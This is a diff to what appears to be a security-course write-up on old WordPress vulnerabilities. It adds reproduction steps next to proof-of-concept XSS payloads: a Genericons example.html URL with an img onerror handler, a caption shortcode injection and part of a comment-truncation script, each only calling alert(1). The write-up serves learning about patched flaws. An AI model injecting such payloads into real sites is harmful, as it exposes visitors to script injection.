@@ -24,6 +24,7 @@ Time spent: **10** hours spent in total
     out += "</a>"
     print out
     ```
+    - View the comment to get the XSS
   - [ ] Affected source code:
     - None, this is an SQL field size limitation that causes this exploit to work due to truncation
   - [ ] Reference:
@@ -44,6 +45,7 @@ Time spent: **10** hours spent in total
     ```
     http://wpsite/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert(1)>
     ```
+    - Click the link to get the XSS
   - [ ] Affected source code:
     - https://core.trac.wordpress.org/browser/tags/4.2/src/wp-content/themes/twentyfifteen/genericons/example.html
     - Removed in WP 4.2.2
@@ -64,6 +66,7 @@ Time spent: **10** hours spent in total
     ```
     [caption width='1' caption='<a href="' ">]</a><a href="onClick='alert(1)'">
     ```
+    - View the post to get the XSS
   - [ ] Affected source code:
     - https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8
   - [ ] Reference:
